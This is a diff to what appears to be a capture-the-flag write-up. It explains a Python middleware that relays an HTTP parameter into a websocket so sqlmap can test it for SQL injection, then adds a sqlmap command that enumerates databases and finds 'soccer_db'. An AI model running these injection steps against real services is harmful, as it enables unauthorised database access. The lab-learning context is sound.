@@ -279,8 +279,18 @@ except KeyboardInterrupt:
 The python script will get a request with a single parameter, and use that to make the websocket connection with that parameter as the injection. This allows `sqlmap` to see a standard HTTP server, but then it does the websockets injection.
 
 ```
-└─$ python3 exploit.py 
+└─$ python3 sqli.py 
 [+] Starting MiddleWare Server
 [+] Send payloads in http://localhost:8081/?id=*
 ```
+Now that we have it running let hit with sqlmap.
+
+```
+sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
+```
+
+![image](https://user-images.githubusercontent.com/69868171/218151389-9fc7213d-abb8-4b63-a4cd-63127bcf42fa.png)
+
+It works `soccer_db` seems interesting let list the tables with sqlmap.
+
 
